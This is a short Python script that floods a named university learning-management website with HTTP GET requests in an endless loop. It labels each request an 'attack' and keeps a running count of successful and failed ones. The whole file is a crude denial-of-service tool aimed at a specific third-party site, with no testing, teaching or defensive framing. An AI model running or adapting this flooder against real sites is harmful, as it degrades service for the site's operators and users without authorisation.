# x
import requests
url = 'http://lms.ui.ac.ir/'
counter = 0
p_ctr=0
f_ctr=0
while 1:
    a = requests.get(url)
    counter += 1
    if str(a) == '<Response [200]>':
        p_ctr += 1
        print('Status : OK | Number of Attacks: %i | Successful Attacks: %i | Failed Attacks: %i' %(counter, p_ctr, f_ctr))
    else:
        f_ctr += 1
        print('Status : Failed :( | Number of Attacks: %i | Successful Attacks: %i | Failed Attacks: %i' %(counter, p_ctr, f_ctr))
